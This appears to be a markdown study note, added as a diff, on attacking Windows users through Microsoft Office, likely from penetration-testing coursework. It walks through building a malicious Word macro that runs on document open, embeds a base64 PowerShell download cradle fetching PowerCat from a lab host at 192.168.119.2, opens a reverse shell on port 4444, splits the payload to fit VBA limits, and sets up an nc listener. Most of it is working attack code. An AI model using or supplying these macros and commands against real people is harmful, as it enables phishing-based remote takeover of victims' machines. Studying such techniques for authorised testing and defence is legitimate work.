@@ -1,0 +1,103 @@
+# Attacks
+### Exploiting Microsoft Office
+- MOTW (Mark of the Web)
+	- Enables protected view
+		- which then means they will have to click learn more then Unblock in file properties
+
+### Leveraging Microsoft Word Macros
+
+- ActiveX Object
+	-  provide access to underlying OS commands
+- WScript
+	- uses ActiveX Objects
+- Windows Script Host Shell Object
+	- uses WScript
+1. Instantiate a Windows Script Host Shell object with Create Object, invoke the Run method for Wscript.Shell
+	- Luanches an app on target machine
+	- ```
+```1. Sub MyMacro()
+		2.CreateObject("Wscript.Shell").Run "powershell"
+		3. End Sub
+````
+2. AutoOpen & Document_Open
+	- events needs to open doc
+	- ```
+		Sub AutoOpen()
+		
+		  MyMacro
+		  
+		End Sub
+		
+		Sub Document_Open()
+		
+		  MyMacro
+		  
+		End Sub
+		
+		Sub MyMacro()
+		
+		  CreateObject("Wscript.Shell").Run "powershell"
+		  
+		End Sub
+``
+3.  Add reverse shell macro using [[PowerCat]]
+	- Use a base64 encoded PowerShell download cradle
+	- VBA has 255-character limit
+		- must split string into multiple variables
+	1. Declare string variabled Str with the Dim Keyword
+		- stores [[Powershell]] cradle & command to create a reverse shell 
+	2. ```
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+``
+4. PowerShell command to download PowerCat and execute the reverse shell```
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+``
+5. Python script to split in 50 characters & combind with Str variable
+	- ```
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
+
+n = 50
+
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+``
+6. Update macro with split strings
+	- ```
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+    ...
+        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+        Str = Str + "A== "
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+``
+7. Start up  nc listener 
+	- should recieve get request for PowerCat file
+	- nc -lvnp 4444
+
+#reverseshell #revshell #powercat #powershell #shells
